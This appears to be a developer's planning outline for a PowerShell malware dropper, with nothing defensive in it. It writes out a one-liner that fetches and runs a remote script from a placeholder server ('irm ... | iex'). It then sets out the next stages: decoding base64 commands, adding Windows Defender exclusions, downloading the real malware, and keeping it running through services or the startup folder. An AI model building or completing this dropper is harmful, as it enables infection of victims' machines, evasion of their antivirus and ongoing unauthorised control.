PS Malware Dropper Execution Steps

Step 1
# User somehow executes a file in admin mode.
## File sets Execution Policy to Unrestricted     
## File executes irm <Server Address>:<Port>/<dropper filename> | iex

Step 2

# The downloaded ps1 file (via the iex pipe) will then be executed. 
# The file will contain base64 encoded powershell commands which the non encoded portion of the dropper will decode and execute
## The decoded commands will first add filename exclusions to the windows defender exclusion list
## It will then download the acutal malware.
## To enable persistence, either windows services will be created or malware will be placed in the startup folder (tbd)

Step 3
# Malware will then be executed
## Malware Features List TBD
